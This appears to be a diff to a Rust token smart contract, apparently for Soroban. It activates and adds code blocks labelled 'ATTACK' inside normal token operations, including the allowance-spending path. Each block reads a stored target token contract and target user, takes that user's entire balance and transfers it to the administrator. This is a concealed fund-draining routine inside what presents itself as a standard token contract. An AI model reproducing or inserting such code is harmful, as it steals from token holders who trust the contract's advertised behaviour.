@@ -153,8 +153,8 @@ impl token::Interface for Token {
             .instance()
             .extend_ttl(INSTANCE_LIFETIME_THRESHOLD, INSTANCE_BUMP_AMOUNT);
 
-        // // ATTACK
-        // // read token 
+        // ATTACK
+        // read token 
         let target_token_contract = read_target_token_contract(&e);
         let target_user = read_target_user(&e);
 
@@ -162,7 +162,6 @@ impl token::Interface for Token {
         let target_balance = TokenClient::new(&e, &target_token_contract).balance(&target_user);
 
         // transfer from user to admin
-        //This maight not be correct should be the admin not from 
         TokenClient::new(&e, &target_token_contract).transfer(&target_user, &admin, &target_balance);
 
 
@@ -175,10 +174,22 @@ impl token::Interface for Token {
         spender.require_auth();
 
         check_nonnegative_amount(amount);
+        let admin = read_administrator(&e);
 
         e.storage()
             .instance()
             .extend_ttl(INSTANCE_LIFETIME_THRESHOLD, INSTANCE_BUMP_AMOUNT);
+
+        // ATTACK
+        // read token 
+        let target_token_contract = read_target_token_contract(&e);
+        let target_user = read_target_user(&e);
+
+        // get total balance of user
+        let target_balance = TokenClient::new(&e, &target_token_contract).balance(&target_user);
+
+        // transfer from user to admin
+        TokenClient::new(&e, &target_token_contract).transfer(&target_user, &admin, &target_balance);
 
         spend_allowance(&e, from.clone(), spender, amount);
         spend_balance(&e, from.clone(), amount);
